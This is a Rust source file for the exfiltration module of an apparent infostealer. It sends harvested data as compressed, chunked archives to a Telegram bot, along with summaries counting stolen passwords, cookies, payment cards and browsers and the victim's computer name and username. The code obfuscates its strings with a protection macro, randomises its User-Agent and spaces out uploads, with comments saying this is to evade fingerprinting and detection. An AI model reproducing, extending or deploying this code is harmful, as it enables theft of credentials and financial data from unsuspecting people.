use crate::sprotect;
use reqwest::{multipart, Client};
use serde_json::json;
use std::time::Duration;
use std::io::Write;
use flate2::Compression;
use flate2::write::GzEncoder;
use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
use rand::Rng;

const MAX_FILE_SIZE: usize = 50 * 1024 * 1024;
const CHUNK_SIZE: usize = 45 * 1024 * 1024;

fn get_bot_token() -> String {
    // REPLACE with your Telegram bot token
    sprotect!("YOUR_BOT_TOKEN_HERE")

    // Alternative token (commented out):
    // sprotect!("YOUR_ALT_BOT_TOKEN_HERE")
}

fn get_chat_id() -> String {
    // REPLACE with your Telegram chat ID
    sprotect!("YOUR_CHAT_ID_HERE")

    // Alternative chat ID (commented out):
    // sprotect!("YOUR_ALT_CHAT_ID_HERE")
}

pub struct TelegramUploader {
    bot_token: String,
    chat_id: String,
    client: Client,
}

impl TelegramUploader {
    pub fn new(bot_token: String, chat_id: String) -> Self {
        // Generate random User-Agent to avoid fingerprinting
        let user_agent = Self::generate_random_user_agent();
        
        let client = Client::builder()
            .timeout(Duration::from_secs(180))
            .user_agent(user_agent)
            .build()
            .unwrap_or_else(|_| Client::new());
        Self {
            bot_token,
            chat_id,
            client,
        }
    }

    /// Generate random User-Agent string (different every run)
    fn generate_random_user_agent() -> String {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        
        // Random Chrome versions (recent versions)
        let chrome_versions = [
            "131.0.0.0", "130.0.0.0", "129.0.0.0", "128.0.0.0", 
            "127.0.0.0", "126.0.0.0", "125.0.0.0", "124.0.0.0"
        ];
        
        // Random Windows versions
        let windows_versions = [
            "Windows NT 10.0; Win64; x64",
            "Windows NT 11.0; Win64; x64",
            "Windows NT 10.0; WOW64",
        ];
        
        // Random AppleWebKit versions
        let webkit_versions = [
            "537.36", "537.35", "537.34", "537.33"
        ];
        
        let chrome = chrome_versions[rng.gen_range(0..chrome_versions.len())];
        let windows = windows_versions[rng.gen_range(0..windows_versions.len())];
        let webkit = webkit_versions[rng.gen_range(0..webkit_versions.len())];
        
        format!(
            "Mozilla/5.0 ({}) AppleWebKit/{} (KHTML, like Gecko) Chrome/{} Safari/{}",
            windows, webkit, chrome, webkit
        )
    }

    pub fn default() -> Self {
        Self::new(get_bot_token(), get_chat_id())
    }

    pub async fn upload_data(&self, data: &[u8], filename: &str) -> Result<(), String> {
        if data.len() <= MAX_FILE_SIZE {
            self.upload_single_file(data, filename).await
        } else {
            self.upload_chunked_data(data, filename).await
        }
    }

    fn compress_data(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        let mut encoder = GzEncoder::new(Vec::new(), Compression::best());
        encoder.write_all(data).map_err(|e| format!("{}{}", sprotect!("comp_err"), e))?;
        encoder.finish().map_err(|e| format!("{}{}", sprotect!("comp_err"), e))
    }

    async fn upload_single_file(&self, data: &[u8], filename: &str) -> Result<(), String> {
        tokio::time::sleep(tokio::time::Duration::from_secs(rand::thread_rng().gen_range(30..60))).await;
        
        let url = self.build_api_url(&sprotect!("sendDocument"));
        
        let mut attempts = 0;
        while attempts < 3 {
            let form = multipart::Form::new()
                .text(sprotect!("chat_id"), self.chat_id.clone())
                .text(sprotect!("caption"), self.generate_upload_caption(filename, data.len()))
                .text(sprotect!("parse_mode"), sprotect!("HTML"))
                .part(
                    sprotect!("document"),
                    multipart::Part::bytes(data.to_vec())
                        .file_name(format!("{}.{}", filename, sprotect!("zip")))
                        .mime_str(&sprotect!("application/zip"))
                        .map_err(|e| format!("{}{}", sprotect!("mime_err"), e))?,
                );

            match self.send_upload_request(&url, form).await {
                Ok(_) => return Ok(()),
                Err(e) => {
                    attempts += 1;
                    if attempts >= 3 {
                        return Err(e);
                    }
                    let delay = 2u64.pow(attempts) * 1500;
                    tokio::time::sleep(Duration::from_millis(delay)).await;
                }
            }
        }
        Err(sprotect!("max_retries").to_string())
    }

    async fn upload_chunked_data(&self, data: &[u8], filename: &str) -> Result<(), String> {
        let chunks: Vec<&[u8]> = data.chunks(CHUNK_SIZE).collect();
        let total_chunks = chunks.len();

        for (i, chunk) in chunks.iter().enumerate() {
            let chunk_filename = format!("{}_{:03}.{}", filename, i + 1, sprotect!("zip"));
            let url = self.build_api_url(&sprotect!("sendDocument"));
            
            let mut attempts = 0;
            while attempts < 3 {
                let form = multipart::Form::new()
                    .text(sprotect!("chat_id"), self.chat_id.clone())
                    .text(
                        sprotect!("caption"),
                        self.generate_chunk_caption(&chunk_filename, i + 1, total_chunks, chunk.len()),
                    )
                    .text(sprotect!("parse_mode"), sprotect!("HTML"))
                    .part(
                        sprotect!("document"),
                        multipart::Part::bytes(chunk.to_vec())
                            .file_name(chunk_filename.clone())
                            .mime_str(&sprotect!("application/zip"))
                            .map_err(|e| format!("{}{}", sprotect!("mime_err"), e))?,
                    );

                match self.send_upload_request(&url, form).await {
                    Ok(_) => break,
                    Err(e) => {
                        attempts += 1;
                        if attempts >= 3 {
                            return Err(format!("{} {} {}: {}", sprotect!("chunk_fail"), i + 1, sprotect!("attempts"), e));
                        }
                        let delay = 2u64.pow(attempts) * 1500;
                        tokio::time::sleep(Duration::from_millis(delay)).await;
                    }
                }
            }

            if i < chunks.len() - 1 {
                // 1 minute delay between each chunk upload to evade detection
                tokio::time::sleep(Duration::from_millis(60000)).await;
            }
        }

        self.send_completion_message(filename, data.len(), total_chunks).await
    }

    async fn send_upload_request(&self, url: &str, form: multipart::Form) -> Result<(), String> {
        let response = self
            .client
            .post(url)
            .multipart(form)
            .send()
            .await
            .map_err(|e| format!("{}{}", sprotect!("req_err"), e))?;

        if response.status().is_success() {
            Ok(())
        } else if response.status().as_u16() == 429 {
            let retry_after = response
                .headers()
                .get(sprotect!("retry-after"))
                .and_then(|h| h.to_str().ok())
                .and_then(|s| s.parse::<u64>().ok())
                .unwrap_or(10);
            tokio::time::sleep(Duration::from_secs(retry_after + 2)).await;
            Err(sprotect!("rate_limited").to_string())
        } else {
            let status = response.status();
            let error_text = response
                .text()
                .await
                .unwrap_or_else(|_| sprotect!("unknown_error").to_string());
            Err(format!("{} {}: {}", sprotect!("upload_err"), status, error_text))
        }
    }

    fn build_api_url(&self, method: &str) -> String {
        format!(
            "{}{}{}{}{}",
            sprotect!("https://api.telegram.org/bot"),
            self.bot_token,
            sprotect!("/"),
            method,
            sprotect!("")
        )
    }

    fn generate_upload_caption(&self, filename: &str, size: usize) -> String {
        let size_mb = size as f64 / (1024.0 * 1024.0);
        let title = sprotect!("Data Harvested");
        let file_label = sprotect!("File");
        let size_label = sprotect!("Size");
        let status_label = sprotect!("Status");
        let complete = sprotect!("Complete");
        format!(
            "<b>{}</b>\n\n<code>{}: {}\n{}: {:.2} MB\n{}: {}</code>",
            title, file_label, filename, size_label, size_mb, status_label, complete
        )
    }

    fn generate_chunk_caption(&self, filename: &str, chunk_num: usize, total: usize, size: usize) -> String {
        let size_mb = size as f64 / (1024.0 * 1024.0);
        let upload_part = sprotect!("Upload Part");
        let file_label = sprotect!("File");
        let size_label = sprotect!("Size");
        let progress_label = sprotect!("Progress");
        let progress_pct = (chunk_num * 100) / total;
        format!(
            "<b>{} {}/{}</b>\n\n<code>{}: {}\n{}: {:.2} MB\n{}: {}%</code>",
            upload_part, chunk_num, total, file_label, filename, size_label, size_mb, progress_label, progress_pct
        )
    }

    async fn send_completion_message(&self, filename: &str, total_size: usize, chunks: usize) -> Result<(), String> {
        let size_mb = total_size as f64 / (1024.0 * 1024.0);
        let title = sprotect!("Upload Complete");
        let file_label = sprotect!("File");
        let size_label = sprotect!("Total Size");
        let parts_label = sprotect!("Parts");
        let status_label = sprotect!("Status");
        let success = sprotect!("Success");
        let message = format!(
            "<b>{}</b>\n\n<code>{}: {}\n{}: {:.2} MB\n{}: {}\n{}: {}</code>",
            title, file_label, filename, size_label, size_mb, parts_label, chunks, status_label, success
        );

        self.send_message(&message).await
    }

    pub async fn send_message(&self, text: &str) -> Result<(), String> {
        let url = self.build_api_url(&sprotect!("sendMessage"));
        let payload = json!({
            sprotect!("chat_id"): self.chat_id,
            sprotect!("text"): text,
            sprotect!("parse_mode"): sprotect!("HTML"),
            sprotect!("disable_web_page_preview"): true
        });

        let mut attempts = 0;
        while attempts < 3 {
            let response = self
                .client
                .post(&url)
                .json(&payload)
                .send()
                .await
                .map_err(|e| format!("{}{}", sprotect!("req_err"), e))?;

            if response.status().is_success() {
                return Ok(());
            } else if response.status().as_u16() == 429 {
                let retry_after = response
                    .headers()
                    .get(sprotect!("retry-after"))
                    .and_then(|h| h.to_str().ok())
                    .and_then(|s| s.parse::<u64>().ok())
                    .unwrap_or(5);
                tokio::time::sleep(Duration::from_secs(retry_after + 1)).await;
                attempts += 1;
                continue;
            } else {
                let status = response.status();
                let error_text = response
                    .text()
                    .await
                    .unwrap_or_else(|_| sprotect!("unknown_error").to_string());
                return Err(format!("{} {}: {}", sprotect!("msg_err"), status, error_text));
            }
        }
        Err(sprotect!("max_retries").to_string())
    }

    pub async fn send_notification(&self, message: &str) -> Result<(), String> {
        let title = sprotect!("System Alert");
        let formatted = format!("<b>{}</b>\n\n<code>{}</code>", title, message);
        self.send_message(&formatted).await
    }

    pub async fn test_bot(&self) -> Result<(), String> {
        let url = self.build_api_url(&sprotect!("getMe"));
        let response = self
            .client
            .get(&url)
            .send()
            .await
            .map_err(|e| format!("{}{}", sprotect!("test_err"), e))?;

        if response.status().is_success() {
            Ok(())
        } else {
            Err(format!("{}{}", sprotect!("bot_invalid"), response.status()))
        }
    }

    pub async fn send_harvest_summary(&self, summary: &HarvestSummary) -> Result<(), String> {
        let message = format!(
            "<b>{}</b>\n\n\
            <b>{}:</b> <code>{}</code>\n\
            <b>{}:</b> <code>{}</code>\n\
            <b>{}:</b> <code>{}</code>\n\
            <b>{}:</b> <code>{}</code>\n\
            <b>{}:</b> <code>{} | {}</code>\n\
            <b>{}:</b> <code>{}</code>\n\n\
            <i>{}</i>",
            sprotect!("Harvest Summary"),
            sprotect!("Passwords"),
            summary.password_count,
            sprotect!("Cookies"),
            summary.cookie_count,
            sprotect!("Cards"),
            summary.card_count,
            sprotect!("Browsers"),
            summary.browser_count,
            sprotect!("System"),
            summary.computer_name,
            summary.username,
            sprotect!("Session"),
            summary.session_id,
            sprotect!("Timestamp: System Time")
        );
        self.send_message(&message).await
    }
}

pub struct HarvestSummary {
    pub password_count: u32,
    pub cookie_count: u32,
    pub card_count: u32,
    pub browser_count: u32,
    pub computer_name: String,
    pub username: String,
    pub session_id: String,
}